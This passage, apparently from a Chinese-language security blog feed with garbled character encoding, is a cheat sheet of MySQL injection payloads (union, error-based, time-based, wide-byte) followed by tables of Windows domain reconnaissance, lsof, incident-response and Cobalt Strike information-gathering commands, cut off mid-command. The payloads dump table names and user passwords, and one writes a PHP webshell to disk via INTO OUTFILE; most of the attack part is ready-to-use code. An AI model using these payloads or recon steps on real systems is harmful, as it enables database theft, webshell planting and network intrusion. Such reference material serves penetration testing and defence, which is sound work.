æŸ¥æ‰¾åº“ä¸­çš„è¡¨<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(â€˜&lt;br&#x2F;&gt;â€™,table_name),6,7,8,9,10 from information_schema.tables where table_schema&#x3D;database()</p><p>â¤ æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µ<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(â€˜&lt;br&#x2F;&gt;â€™,column_name),6,7,8,9,10 from information_schema.columns where table_schema&#x3D;â€™æ•°æ®åº“åâ€™ and table_name&#x3D;â€™è¡¨åâ€™</p><p>â¤ æŸ¥è¯¢å­—æ®µé‡Œé¢çš„æ•°æ®<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(â€˜&lt;br&#x2F;&gt;â€™,å­—æ®µå),6,7,8,9,10 from table_name&#x3D;â€™è¡¨åâ€™</p><p>union select 1,group_concat(å­—æ®µå),group_concat(å­—æ®µå) from usersï¼ˆè¡¨åï¼‰â€“+</p><p>union+select+1,2,3,4,concat_ws(%27~%27,sclname,sclpx),6,7,8,9,10,11,12+from+shuichuliâ€“+</p><p>-1â€™ union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3â€“+</p><p>â¤ å†™å…¥æ–‡ä»¶<br>?id&#x3D;-1â€™ union select 1,2,â€™<?php assert($_POST[less1]);?>â€˜ into outfile â€˜C:&#x2F;less1.phpâ€™â€“ s<br></pre></p></td></tr></tbody></table></figure><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p><code>ä¸€ã€å½“æ— æ•ˆè¾“å…¥ä¼ é€’ç»™æ•°æ®åº“æ—¶ï¼Œé€šè¿‡è§¦å‘æ•°æ®åº“ä¸­çš„é”™è¯¯æ¥åˆ©ç”¨åŸºäºé”™è¯¯çš„æ³¨å…¥ã€‚åœ¨mysqlé«˜ç‰ˆæœ¬ï¼ˆå¤§äº5.1ç‰ˆæœ¬ï¼‰ä¸­æ·»åŠ äº†å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°updatexml(),extractvalue() å½“è¿™ä¸¤ä¸ªå‡½æ•°åœ¨æ‰§è¡Œæ—¶ï¼Œå¦‚æœå‡ºç°xmlæ–‡æ¡£è·¯å¾„é”™è¯¯å°±ä¼šäº§ç”ŸæŠ¥é”™</code></p><p>1ï¼‰updatexml()æŠ¥é”™æ³¨å…¥</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ çˆ†ç ´æ•°æ®åº“ç‰ˆæœ¬?id=1'+updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23<p>â¤ çˆ†å‡ºæ•°æ®åº“åŠç›¸å…³ä¿¡æ¯<br>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#</p><p>â¤ çˆ†å½“å‰æ•°æ®åº“è¡¨ä¿¡æ¯<br>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) #</p><p>â¤ çˆ†æ•°æ®è¡¨å­—æ®µä¿¡æ¯<br>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€™æ•°æ®åº“åâ€™ and table_name&#x3D;â€™è¡¨åâ€™),0x7e),1) #</p><p>â¤ çˆ†æ•°æ®åº“å†…å®¹<br>?id&#x3D;1â€™ and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.userséœ€è‡ªè¡Œä¿®æ”¹)),1) #<br></pre></p></td></tr></tbody></table></figure><p>2ï¼‰extractvalueï¼ˆï¼‰æŠ¥é”™æ³¨å…¥</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ çˆ†ç ´å½“å‰æ•°æ®åº“ä¿¡æ¯1' and extractvalue(1,concat(0x5c,(select database())))#<p>â¤ çˆ†ç ´å½“å‰æ•°æ®åº“è¡¨å<br>1â€™ and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€™æ•°æ®åº“åâ€™)))#</p><p>â¤ çˆ†ç ´å½“å‰æ•°æ®åº“åˆ—å<br>1â€™ and extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;â€™æ•°æ®è¡¨åâ€™)))#</p><p>â¤ çˆ†ç ´å½“å‰æ•°æ®åº“æ•°æ®<br>1â€™ and extractvalue(1,concat(0x5c,( select group_concat(åˆ—å,0x3a,åˆ—å) from æ•°æ®è¡¨å)))#<br></pre></p></td></tr></tbody></table></figure><p>3ï¼‰floor() æŠ¥é”™æ³¨å…¥</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ çˆ†ç ´æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23<p>â¤ çˆ†ç ´å½“å‰ç”¨æˆ·<br>?id&#x3D;1â€™+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p><p>â¤ çˆ†ç ´å½“å‰ä½¿ç”¨çš„æ•°æ®åº“<br>?id&#x3D;1â€™+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p><p>â¤ çˆ†ç ´æŒ‡å®šè¡¨çš„å­—æ®µ<br>?id&#x3D;1â€™ +and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name&#x3D;0x656d61696c73 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23<br></pre></p></td></tr></tbody></table></figure><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>1ï¼‰ä¸»è¦ä½¿ç”¨sleep()å‡½æ•°è¿›è¡Œåˆ¤æ–­</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>if(ascii(substr(user(),1,1))=114,sleep(5),2)id=1' and length(database())>=4--+</pre></td></tr></tbody></table></figure><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥</pre></td></tr></tbody></table></figure><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>id=1%df'id=1%df' %23id=1%df' union select 1,2,3,database(),5,6,7,8%23</pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> MYSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤é€ŸæŸ¥è¡¨--é•¿æœŸæ›´æ–°</title>
      <link href="/2022/09/03/%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8--%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
      <url>/2022/09/03/%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8--%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/Code/2.png" data-caption="image-code"><img src="/../images/Code/2.png" alt="image-code"></a></p><h2 id="cmdä¿¡æ¯æ”¶é›†åŸºæœ¬å‘½ä»¤"><a href="#cmdä¿¡æ¯æ”¶é›†åŸºæœ¬å‘½ä»¤" class="headerlink" title="cmdä¿¡æ¯æ”¶é›†åŸºæœ¬å‘½ä»¤"></a>cmdä¿¡æ¯æ”¶é›†åŸºæœ¬å‘½ä»¤</h2><table><thead><tr><th>å‘½ä»¤</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>ipconfig &#x2F;all</td><td>æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰</td></tr><tr><td>net user</td><td>æœ¬æœºç”¨æˆ·åˆ—è¡¨</td></tr><tr><td>net localgroup administrators</td><td>æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]</td></tr><tr><td>net user &#x2F;domain</td><td>æŸ¥è¯¢åŸŸç”¨æˆ·</td></tr><tr><td>net group &#x2F;domain</td><td>æŸ¥è¯¢åŸŸé‡Œé¢çš„å·¥ä½œç»„</td></tr><tr><td>net group â€œdomain adminsâ€ &#x2F;domain</td><td>æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„</td></tr><tr><td>net localgroup administrators &#x2F;domain</td><td>ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜</td></tr><tr><td>net localgroup administrators workgroup\user001 &#x2F;add</td><td>åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº</td></tr><tr><td>net group â€œdomain controllersâ€ &#x2F;domain</td><td>æŸ¥çœ‹åŸŸæ§åˆ¶å™¨(å¦‚æœæœ‰å¤šå°)</td></tr><tr><td>net time &#x2F;domain</td><td>åˆ¤æ–­ä¸»åŸŸï¼Œä¸»åŸŸæœåŠ¡å™¨éƒ½åšæ—¶é—´æœåŠ¡å™¨</td></tr><tr><td>net config workstation</td><td>å½“å‰ç™»å½•åŸŸ</td></tr><tr><td>net session</td><td>æŸ¥çœ‹å½“å‰ä¼šè¯</td></tr><tr><td>net use \ip\ipc$ pawword &#x2F;user:username</td><td>å»ºç«‹IPCä¼šè¯</td></tr><tr><td>net share</td><td>æŸ¥çœ‹SMBæŒ‡å‘çš„è·¯å¾„[å³å…±äº«]</td></tr><tr><td>net view</td><td>æŸ¥è¯¢åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨</td></tr><tr><td>net view \ip</td><td>æŸ¥è¯¢æŸIPå…±äº«</td></tr><tr><td>net view &#x2F;domain</td><td>æŸ¥è¯¢åŸŸåˆ—è¡¨</td></tr><tr><td>net view &#x2F;domain:domainname</td><td>æŸ¥çœ‹workgroupåŸŸä¸­è®¡ç®—æœºåˆ—è¡¨</td></tr><tr><td>net start</td><td>æŸ¥çœ‹å½“å‰è¿è¡Œçš„æœåŠ¡</td></tr><tr><td>net accounts</td><td>æŸ¥çœ‹æœ¬åœ°å¯†ç ç­–ç•¥</td></tr><tr><td>net accounts &#x2F;domain</td><td>æŸ¥çœ‹åŸŸå¯†ç ç­–ç•¥</td></tr><tr><td>nbtstat â€“A ip</td><td>netbios æŸ¥è¯¢</td></tr><tr><td>netstat â€“an&#x2F;ano&#x2F;anb</td><td>ç½‘ç»œè¿æ¥æŸ¥è¯¢</td></tr><tr><td>route print</td><td>è·¯ç”±è¡¨</td></tr><tr><td>tasklist &#x2F;V</td><td>æŸ¥çœ‹è¿›ç¨‹[æ˜¾ç¤ºå¯¹åº”ç”¨æˆ·]</td></tr><tr><td>tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V</td><td>æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºè¿›ç¨‹åˆ—è¡¨</td></tr><tr><td>qprocess *</td><td>ç±»ä¼¼tasklist</td></tr><tr><td>qprocess &#x2F;SERVER:IP</td><td>è¿œç¨‹æŸ¥çœ‹è®¡ç®—æœºè¿›ç¨‹åˆ—è¡¨</td></tr><tr><td>nslookup â€“qt-MX Yahoo.com</td><td>æŸ¥çœ‹é‚®ä»¶æœåŠ¡å™¨</td></tr><tr><td>whoami &#x2F;all</td><td>æŸ¥è¯¢å½“å‰ç”¨æˆ·æƒé™ç­‰</td></tr><tr><td>set</td><td>æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå˜é‡</td></tr><tr><td>systeminfo</td><td>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</td></tr><tr><td>qwinsta</td><td>æŸ¥çœ‹ç™»å½•æƒ…å†µ</td></tr><tr><td>qwinsta &#x2F;SERVER:IP</td><td>æŸ¥çœ‹è¿œç¨‹ç™»å½•æƒ…å†µ</td></tr><tr><td>fsutil fsinfo drives</td><td>æŸ¥çœ‹æ‰€æœ‰ç›˜ç¬¦</td></tr><tr><td>gpupdate &#x2F;force</td><td>æ›´æ–°åŸŸç­–ç•¥</td></tr><tr><td>cmdkey &#x2F;l</td><td>çœ‹æ˜¯å¦ä¿å­˜äº†ç™»é™†å‡­è¯ã€‚ï¼ˆæ”»å‡»è€…ä¼šå…ˆæŸ¥çœ‹ç®¡ç†å‘˜æ˜¯å¦ä¿ç•™äº†ç™»é™†å‡­è¯ï¼Œæ–¹ä¾¿åç»­çš„å‡­è¯æŠ“å–ã€‚ï¼‰</td></tr><tr><td>echo %logonserver%</td><td>æŸ¥çœ‹ç™»é™†åŸŸ</td></tr></tbody></table><h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><table><thead><tr><th align="left">å‘½ä»¤</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td align="left">lsof -i</td><td>æ˜¾ç¤ºæ‰€æœ‰è¿æ¥</td></tr><tr><td align="left">lsof -i 4</td><td>æŸ¥çœ‹IPv4æµé‡</td></tr><tr><td align="left">lsof -i 6</td><td>æŸ¥çœ‹IPv6æµé‡</td></tr><tr><td align="left">lsof -i TCP</td><td>æŸ¥çœ‹TCPæµé‡</td></tr><tr><td align="left">lsof  -i UDP</td><td>æŸ¥çœ‹UDPæµé‡</td></tr><tr><td align="left">lsof -i :22</td><td>æŸ¥çœ‹ç«¯å£ç»‘å®šçš„åº”ç”¨</td></tr><tr><td align="left">lsof <a href="mailto:&#x2d;&#105;&#64;&#x31;&#46;&#49;&#x2e;&#x31;&#x2e;&#49;">&#x2d;&#105;&#64;&#x31;&#46;&#49;&#x2e;&#x31;&#x2e;&#49;</a></td><td>æ˜¾ç¤ºæŒ‡å®šä¸»æœºè¿æ¥çš„ä¿¡æ¯</td></tr><tr><td align="left">lsof <a href="mailto:&#x2d;&#x69;&#64;&#49;&#46;&#x31;&#46;&#49;&#x2e;&#x31;">&#x2d;&#x69;&#64;&#49;&#46;&#x31;&#46;&#49;&#x2e;&#x31;</a>:3333</td><td>æ˜¾ç¤ºåŸºäºä¸»æœºä¸ç«¯å£è¿æ¥çš„ä¿¡æ¯</td></tr><tr><td align="left">lsof -i -sTCP:LISTEN</td><td>æ˜¾ç¤ºæ­£åœ¨ç›‘å¬çš„ç«¯</td></tr><tr><td align="left">lsof -i -sTCP:ESTABLISHED</td><td>æ˜¾ç¤ºå·²å»ºç«‹è¿æ¥ä¿¡æ¯</td></tr><tr><td align="left">lsof -u root</td><td>æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·æ‰“å¼€æ–‡ä»¶ä¿¡æ¯</td></tr><tr><td align="left">lsof -u ^root</td><td>æ˜¾ç¤ºé™¤æŒ‡å®šç”¨æˆ·å¤–æ‰“å¼€æ–‡ä»¶ä¿¡æ¯</td></tr><tr><td align="left">lsof -p 22222</td><td>æ˜¾ç¤ºæŒ‡å®šPIDæ‰“å¼€æ–‡ä»¶ä¿¡æ¯</td></tr><tr><td align="left">lsof &#x2F;var&#x2F;log&#x2F;messages</td><td>æ˜¾ç¤ºä¸æŒ‡å®šç›®å½•äº¤äº’çš„æ‰€æœ‰ä¸€åˆ‡</td></tr><tr><td align="left">lsof &#x2F;home&#x2F;daniel&#x2F;firewall_whitelist.txt</td><td>æ˜¾ç¤ºä¸æŒ‡å®šæ–‡ä»¶äº¤äº’çš„æ‰€æœ‰ä¸€åˆ‡</td></tr></tbody></table><h2 id="Windwosåº”æ€¥å“åº”"><a href="#Windwosåº”æ€¥å“åº”" class="headerlink" title="Windwosåº”æ€¥å“åº”"></a>Windwosåº”æ€¥å“åº”</h2><table><thead><tr><th>å‘½ä»¤</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>netstat -ano</td><td>æŸ¥çœ‹ç«¯å£æƒ…å†µ</td></tr><tr><td>tasklist | findstr â€œPIDâ€</td><td>å®šä½PID</td></tr><tr><td>netstat -ano -p tcp</td><td>æŸ¥çœ‹ç«¯å£æƒ…å†µï¼ŒæŒ‡å®šTCP</td></tr><tr><td>systeminfo</td><td>ç³»ç»Ÿä¿¡æ¯æ ¸æŸ¥è¿â¾</td></tr><tr><td>lusrmgr.msc</td><td>å¯ç–‘è´¦å·æ’æŸ¥ï¼ˆWin+Rï¼‰</td></tr><tr><td>regedit</td><td>æŸ¥çœ‹æ³¨å†Œè¡¨</td></tr><tr><td>C:\Documents and Settings&#x2F;</td><td>æŸ¥çœ‹ç”¨æˆ·ç›®å½•</td></tr><tr><td>%UserProfile%\Recent</td><td>æŸ¥çœ‹æœ€è¿‘æ–‡ä»¶ï¼ˆWin+Rï¼‰</td></tr><tr><td>eventvwr.msc</td><td>æŸ¥çœ‹æ—¥å¿—äº‹ä»¶</td></tr><tr><td>C:\Windows\System32\winevt\Logs</td><td>æ—¥å¿—å­˜å‚¨è·¯å¾„</td></tr><tr><td>msconfig</td><td>å¼‚å¸¸å¯åŠ¨é¡¹(Win+R)</td></tr><tr><td>taskschd.msc</td><td>è®¡åˆ’ä»»åŠ¡(Win+R)</td></tr><tr><td>schtasks.exe</td><td>cmd,æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</td></tr><tr><td>taskkill &#x2F;T &#x2F;F &#x2F;PID pidå·</td><td>å¼ºåˆ¶æ€æ­»è¿›ç¨‹ï¼ˆ&#x2F;Få¼ºåˆ¶ã€&#x2F;Tå­è¿›ç¨‹ï¼‰</td></tr><tr><td>services.msc</td><td>æœåŠ¡ç®¡ç†å™¨</td></tr></tbody></table><h2 id="Linux-åº”æ€¥å“åº”"><a href="#Linux-åº”æ€¥å“åº”" class="headerlink" title="Linux åº”æ€¥å“åº”"></a>Linux åº”æ€¥å“åº”</h2><h2 id="Cobaltstrikeä¿¡æ¯æ”¶é›†"><a href="#Cobaltstrikeä¿¡æ¯æ”¶é›†" class="headerlink" title="Cobaltstrikeä¿¡æ¯æ”¶é›†"></a>Cobaltstrikeä¿¡æ¯æ”¶é›†</h2><table><thead><tr><th>åŸŸç¯å¢ƒåˆ¤æ–­</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>ipconfig &#x2F;all</td><td>æŸ¥çœ‹ç½‘å¡è¯¦ç»†ä¿¡æ¯,è‹¥å­˜åœ¨åŸŸï¼Œä¸»DNSåç¼€ä¼šæ˜¾ç¤ºåŸŸä¿¡æ¯,è‹¥ä¸ºå·¥ä½œç»„åˆ™ä¸æ˜¾ç¤º</td></tr><tr><td>shell systemctl</td><td>æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</td></tr><tr><td>shell net config workstation</td><td>æŸ¥çœ‹å½“å‰ç™»å½•åŸŸä¿¡æ¯</td></tr><tr><td>shell net time &#x2F;domain</td><td>æŸ¥çœ‹åŸŸå†…æ—¶é—´</td></tr></tbody></table><table><thead><tr><th>åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>shell net view &#x2F;domain</td><td>æŸ¥çœ‹åŸŸåˆ—è¡¨</td></tr><tr><td>shell net view &#x2F;domain:åŸŸåç§°</td><td>æšä¸¾åŸŸä¸»æœºï¼ˆéƒ¨åˆ†ä¸»æœºï¼Œç½‘ä¸Šé‚»å±…å†…å®¹ï¼‰</td></tr><tr><td>shell net group â€œdomain  computersâ€ &#x2F;domain</td><td>æŸ¥çœ‹åŸŸå†…æˆå‘˜</td></tr><tr><td>net user &#x2F;domain</td><td>æŸ¥çœ‹åŸŸå†…æˆå‘˜</td></tr><tr><td>shell net group â€œdomain  adminsâ€ &#x2F;domain</td><td>æŸ¥çœ‹åŸŸç®¡ç†å‘˜</td></tr><tr><td>shell net group â€œdomain  controllersâ€ &#x2F;domain</td><td>æŸ¥çœ‹åŸŸæ§ä¸»æœº</td></tr><tr><td>shell nltest&#x2F;dclist:åŸŸåç§°</td><td>æŸ¥çœ‹åŸŸæ§ä¸»æœº</td></tr><tr><td>shell ping ä¸»æœºå(å¯åœ¨æšä¸¾åŸŸä¸»æœºæŸ¥æ‰¾)</td><td>æŸ¥çœ‹ç›®æ ‡ä¸»æœºIP</td></tr><tr><td>shell nslookup ä¸»æœºå</td><td>æŸ¥çœ‹ç›®æ ‡ä¸»æœºIP</td></tr><tr><td>shell net group  â€œenterprise adminsâ€ &#x2F;domain</td><td>æŸ¥è¯¢ä¼ä¸šç®¡ç†å‘˜ï¼ŒæŸ¥è¯¢ä¼ä¸šæŒ‡å®šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·ã€‚</td></tr><tr><td>shell nltest &#x2F;domain_trusts</td><td>æŸ¥çœ‹åŸŸä¿¡ä»»å…³ç³»</td></tr><tr><td>shell net vire \ä¸»æœºå</td><td>åˆ—å‡ºä¸»æœºå…±äº«åˆ—è¡¨</td></tr><tr><td>shell wmic useraccount get  &#x2F;all</td><td>æŸ¥è¯¢åŸŸç”¨æˆ·è¯¦ç»†ä¿¡æ¯</td></tr><tr><td>shell whoami &#x2F;all</td><td>è·å–åŸŸSIDï¼Œè·å–åŸŸSIDå€¼ï¼Œå¯ä»¥ç”¨äºç¥¨æ®ä¼ é€’æ”»å‡»ã€‚</td></tr><tr><td>shell net time &#x2F;domain</td><td>æŸ¥çœ‹åŸŸå†…æ—¶é—´ï¼ˆå¯ä½œå®šä½ä¸»åŸŸæ§åˆ¶å™¨ï¼‰</td></tr><tr><td>shell net localgroup  administrators &#x2F;domain</td><td>æŸ¥çœ‹ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜</td></tr><tr><td>shell netdom query pdc</td><td>æŸ¥çœ‹åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨</td></tr><tr><td>shell nltest &#x2F;DCLIST:åŸŸåç§°</td><td>é€šè¿‡nltestå®šä½ä¸»åŸŸæ§åˆ¶å™¨</td></tr><tr><td>shell net accounts &#x2F;domain</td><td>æŸ¥çœ‹åŸŸå†…å¯†ç ç­–ç•¥ä¿¡æ¯</td></tr></tbody></table><table><thead><tr><th>å•ä¸»æœºä¿¡æ¯æ”¶é›†</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>shell ipconfig &#x2F;all</td><td>æŸ¥çœ‹æœ¬æœºç½‘ç»œé…ç½®ä¿¡æ¯</td></tr><tr><td>systeminfo | findstr &#x2F;B  &#x2F;C:â€OS Nmaeâ€ &#x2F;C:â€OS Versionâ€</td><td>æŸ¥çœ‹æ“ä½œç³»ç»ŸåŠç‰ˆæœ¬ä¿¡æ¯ï¼Œé’ˆå¯¹æ€§æœé›†ç›¸å…³ç³»ç»Ÿç‰ˆæœ¬çš„æ¼æ´EXPï¼Œè‹±æ–‡ç‰ˆç³»ç»Ÿç”¨è¿™æ¡å‘½ä»¤</td></tr><tr><td>systeminfo | findstr &#x2F;B  &#x2F;C:â€OS åç§°â€ &#x2F;C:â€OS ç‰ˆæœ¬â€</td><td>æŸ¥çœ‹æ“ä½œç³»ç»ŸåŠç‰ˆæœ¬ä¿¡æ¯ï¼Œé’ˆå¯¹æ€§æœé›†ç›¸å…³ç³»ç»Ÿç‰ˆæœ¬çš„æ¼æ´EXPï¼Œä¸­æ–‡ç‰ˆç³»ç»Ÿç”¨è¿™æ¡å‘½ä»¤</td></tr><tr><td>shell echo  %PROCESSOR_ARCHITECTURE%</td><td>æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„ï¼Œéœ€è¦ä½¿ç”¨ç›¸å¯¹åº”ç‰ˆæœ¬å…¼å®¹æ€§çš„æ¸—é€å·¥å…·</td></tr><tr><td>shell wmic product get  name,version</td><td>æŸ¥çœ‹å®‰è£…ç¨‹åºåŠç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td>shell wmic service list brief</td><td>æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯</td></tr><tr><td>shell tasklist &#x2F;v</td><td>æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼ŒæŸ¥çœ‹å½“å‰è¿›ç¨‹åˆ—è¡¨å¯¹åº”çš„ç”¨æˆ·èº«ä»½å‘½ä»¤ã€å¯¹åº”æ‰§è¡Œçš„ç”¨æˆ·èº«ä»½</td></tr><tr><td>shell tasklist &#x2F;svc</td><td>æŸ¥çœ‹å½“å‰æœ¬åœ°è¿è¡Œçš„ç¨‹åºã€è¿›ç¨‹PIDå·ã€æœåŠ¡åï¼Œå¯ä»¥å°†æ‰§è¡Œå‘½ä»¤çš„è¿”å›ç»“æœå»æŸ¥è¯¢æ˜¯å¦æœ‰æ€æ¯’è½¯ä»¶åœ¨è¿è¡Œ</td></tr><tr><td>shell wmic startup get  command,caption</td><td>æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯ï¼Œäº†è§£å½“å‰æœºå™¨å¼€æœºçš„æ—¶å€™ä¼šè¿è¡Œå“ªäº›ç¨‹åºï¼Œæ˜¯å¦å¯åˆ©ç”¨è‡ªå¯åŠ¨åŠ«æŒ</td></tr><tr><td>shell schtasks &#x2F;query &#x2F;fo LIST  &#x2F;v</td><td>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</td></tr><tr><td>shell net statistics  workstation</td><td>æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´ï¼Œåˆ¤æ–­è¿™å°æœºå™¨çš„ç®¡ç†å‘˜æ˜¯ä¸æ˜¯ç»å¸¸åœ¨ç™»é™†è¿™å°æœºå™¨</td></tr><tr><td>shell net user</td><td>æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨</td></tr><tr><td>shell query user || qwinsta</td><td>æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</td></tr><tr><td>shell netstat -ano</td><td>æŸ¥çœ‹æœ¬æœºç«¯å£å¼€æ”¾æƒ…å†µï¼ŒæŸ¥çœ‹è¿æ¥åˆ†ææ˜¯å¦å­˜åœ¨æ•æ„ŸæœåŠ¡</td></tr><tr><td>shell wmic qfe get  Caption,Description,HotFixID,InstalledOn</td><td>æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯ï¼ŒåŒ…å«è¯´æ˜é“¾æ¥&#x2F;è¡¥ä¸æè¿°&#x2F;KBç¼–å·&#x2F;æ›´æ–°æ—¶é—´ç­‰ä¿¡æ¯</td></tr><tr><td>shell wmic qfe list full</td><td>æŸ¥è¯¢è¡¥ä¸å…¨éƒ¨ä¿¡æ¯</td></tr><tr><td>shell route print</td><td>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</td></tr><tr><td>shell arp -a</td><td>æŸ¥çœ‹arpç¼“å­˜</td></tr><tr><td>shell netsh firewall show  config</td><td>æŸ¥çœ‹é˜²ç«å¢™é…ç½®</td></tr></tbody></table><table><thead><tr><th>3389</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>shell REG QUERY  â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal  Server\WinStations\RDP-Tcpâ€ &#x2F;V PortNumber</td><td>æŸ¥çœ‹è¿œç¨‹æ¡Œé¢æœåŠ¡æ˜¯å¦å¼€å¯ï¼Œåœ¨cmdä¸‹ä½¿ç”¨æ³¨å†Œè¡¨æŸ¥è¯¢è¯­å¥ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼Œå¾—åˆ°è¿æ¥ç«¯å£ä¸º0xd3dï¼Œè½¬æ¢åä¸º3389</td></tr><tr><td>shell REG ADD  HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer &#x2F;v  